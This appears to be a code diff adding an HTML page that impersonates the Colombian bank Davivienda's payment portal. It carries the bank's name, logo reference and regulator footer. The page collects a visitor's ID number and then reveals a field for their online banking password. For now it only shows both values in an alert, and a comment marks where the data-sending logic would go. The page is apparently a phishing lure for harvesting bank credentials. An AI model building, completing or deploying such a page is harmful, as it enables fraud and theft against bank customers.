@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos Davivienda</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- Configuración General --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f0f2f7; 
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* --- Header --- */
+        .header {
+            background-color: #ffffff;
+            padding: 20px 40px;
+            width: 100%;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02); 
+            z-index: 10;
+        }
+
+        .logo {
+            height: 35px; 
+            width: auto;
+        }
+
+        /* --- Contenedor Principal --- */
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            gap: 100px; 
+            z-index: 5;
+            position: relative;
+        }
+
+        /* --- Sección de Texto --- */
+        .text-section {
+            max-width: 400px;
+        }
+
+        .text-section h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+            letter-spacing: -0.5px;
+        }
+
+        .text-section h2 {
+            font-size: 34px;
+            font-weight: 700;
+            color: #222;
+            letter-spacing: -0.5px;
+        }
+
+        /* --- Formulario y Tarjeta --- */
+        .form-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 20px;
+            width: 100%;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            border: 1px solid #e5e5e5;
+            margin-bottom: 25px;
+            /* Transición suave para cuando la tarjeta crece en altura */
+            transition: height 0.3s ease; 
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 16px;
+            font-family: 'Montserrat', sans-serif;
+            border: 1px solid #888; 
+            border-radius: 8px;
+            background-color: #fff;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input::placeholder {
+            color: #999;
+        }
+
+        select:focus, input:focus {
+            border-color: #d32f2f; 
+        }
+
+        .select-container {
+            position: relative;
+        }
+        select {
+            appearance: none; 
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            cursor: pointer;
+        }
+        .select-container::after {
+            content: '\2304'; 
+            font-size: 20px;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #333;
+            pointer-events: none;
+        }
+
+        /* --- NUEVO: Estilos para el campo oculto de la clave --- */
+        .clave-oculta {
+            display: none; /* Oculto por defecto */
+            opacity: 0;
+            transform: translateY(-10px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            margin-top: 15px; /* Espacio extra entre cédula y clave */
+        }
+
+        /* Cuando se activa, se muestra con animación */
+        .clave-oculta.mostrar {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* --- Botones --- */
+        .actions {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            gap: 15px;
+        }
+
+        .btn-continue {
+            background-color: #e0e0e0; 
+            color: #666;
+            border: none;
+            padding: 15px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: not-allowed;
+            width: 60%;
+            font-family: 'Montserrat', sans-serif;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .btn-continue.active {
+            background-color: #d32f2f; 
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-continue.active:hover {
+            background-color: #b71c1c; 
+        }
+
+        .btn-cancel {
+            color: #333;
+            font-size: 15px;
+            font-weight: 600;
+            text-decoration: none;
+            padding: 5px 15px;
+            cursor: pointer;
+        }
+
+        .btn-cancel:hover {
+            text-decoration: underline;
+        }
+
+        /* --- Elemento Decorativo de Fondo --- */
+        .bg-shape {
+            position: absolute;
+            bottom: -100px;
+            left: -100px;
+            width: 600px;
+            height: 600px;
+            background-color: #e2e5eb; 
+            border-radius: 50%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        /* --- Footer --- */
+        .footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 9px;
+            color: #555;
+            z-index: 10;
+        }
+
+        .footer-logos {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            align-items: center;
+            text-transform: uppercase;
+        }
+
+        /* =========================================
+           MEDIA QUERIES (Móviles)
+           ========================================= */
+        @media (max-width: 768px) {
+            .header { padding: 15px 20px; }
+            .main-container {
+                flex-direction: column; 
+                padding: 20px;
+                gap: 40px;
+                justify-content: flex-start;
+                margin-top: 20px;
+            }
+            .text-section { width: 100%; text-align: left; }
+            .text-section h1 { font-size: 22px; }
+            .text-section h2 { font-size: 26px; }
+            .form-wrapper { width: 100%; }
+            .card { padding: 25px 20px; }
+            .btn-continue { width: 80%; }
+            .bg-shape { display: none; }
+            .footer { margin-top: auto; padding-bottom: 30px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <img src="los-logos-davi.png" alt="Davivienda Logo" class="logo">
+    </header>
+
+    <main class="main-container">
+        
+        <div class="text-section">
+            <h1>Pagos Davivienda</h1>
+            <h2>para Persona Natural</h2>
+        </div>
+
+        <div class="form-wrapper">
+            <div class="card">
+                <form action="#" id="formulario">
+                    <!-- Campo 1: Tipo de documento -->
+                    <div class="input-group">
+                        <label for="tipo-doc">Seleccione el tipo de documento</label>
+                        <div class="select-container">
+                            <select id="tipo-doc">
+                                <option value="cc">Cédula de Ciudadanía</option>
+                                <option value="ce">Cédula de Extranjería</option>
+                                <option value="nit">NIT</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Campo 2: Número de documento -->
+                    <div class="input-group" style="margin-bottom: 0;"> <!-- Quitamos margen inferior para que se pegue al de abajo -->
+                        <label for="num-doc">Ingrese el número de documento</label>
+                        <input type="text" id="num-doc" placeholder="Ingrese su número de documento">
+                    </div>
+
+                    <!-- Campo 3 (Oculto): Clave Virtual -->
+                    <div class="clave-oculta" id="contenedorClave">
+                        <div class="input-group" style="margin-bottom: 0;">
+                            <label for="clave-virtual">Ingrese su clave virtual</label>
+                            <input type="password" id="clave-virtual" placeholder="Ingrese su clave">
+                        </div>
+                    </div>
+                </form>
+            </div>
+
+            <!-- Botones fuera de la tarjeta -->
+            <div class="actions">
+                <button id="btnContinuar" class="btn-continue" disabled>Continuar</button>
+                <a class="btn-cancel">Cancelar</a>
+            </div>
+        </div>
+
+    </main>
+
+    <div class="bg-shape"></div>
+
+    <footer class="footer">
+        <div class="footer-logos">
+            <span>VIGILADO</span>
+            <span>SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
+        </div>
+    </footer>
+
+    <!-- ========================================== -->
+    <!-- SCRIPT LÓGICA DEL FORMULARIO DESPLEGABLE   -->
+    <!-- ========================================== -->
+    <script>
+        // Referencias a los elementos
+        const inputDocumento = document.getElementById('num-doc');
+        const contenedorClave = document.getElementById('contenedorClave');
+        const inputClave = document.getElementById('clave-virtual');
+        const btnContinuar = document.getElementById('btnContinuar');
+
+        // Variable de control para saber en qué paso estamos
+        let mostrandoClave = false;
+
+        // --- Lógica de validación de los inputs ---
+        // Esta función revisa qué campos están visibles y si tienen texto
+        function validarBoton() {
+            if (!mostrandoClave) {
+                // Si solo está el documento, validamos que tenga texto
+                if (inputDocumento.value.trim().length > 0) {
+                    btnContinuar.removeAttribute('disabled');
+                    btnContinuar.classList.add('active');
+                } else {
+                    btnContinuar.setAttribute('disabled', 'true');
+                    btnContinuar.classList.remove('active');
+                }
+            } else {
+                // Si ya estamos en el paso de la clave, validamos ambos campos
+                if (inputDocumento.value.trim().length > 0 && inputClave.value.trim().length > 0) {
+                    btnContinuar.removeAttribute('disabled');
+                    btnContinuar.classList.add('active');
+                } else {
+                    btnContinuar.setAttribute('disabled', 'true');
+                    btnContinuar.classList.remove('active');
+                }
+            }
+        }
+
+        // Escuchamos cuando el usuario escribe en el documento
+        inputDocumento.addEventListener('input', validarBoton);
+
+        // Escuchamos cuando el usuario escribe en la clave
+        inputClave.addEventListener('input', validarBoton);
+
+        // --- Lógica al hacer clic en "Continuar" ---
+        btnContinuar.addEventListener('click', function(e) {
+            e.preventDefault(); // Evita que el formulario se envíe y recargue la página
+
+            if (!mostrandoClave) {
+                // PASO 1: Mostrar el campo de la clave
+                mostrandoClave = true;
+                
+                // Mostramos el contenedor con animación
+                contenedorClave.classList.add('mostrar');
+                
+                // Hacemos foco en el nuevo campo automáticamente
+                setTimeout(() => {
+                    inputClave.focus();
+                }, 300); // Pequeño delay para esperar la animación
+
+                // Validamos el botón (como la clave está vacía, volverá a gris)
+                validarBoton();
+
+            } else {
+                // PASO 2: Enviar los datos (Aquí iría tu lógica real)
+                alert('Pago procesado con éxito. Documento: ' + inputDocumento.value + ' - Clave: ' + inputClave.value);
+            }
+        });
+    </script>
+
+</body>
+</html>
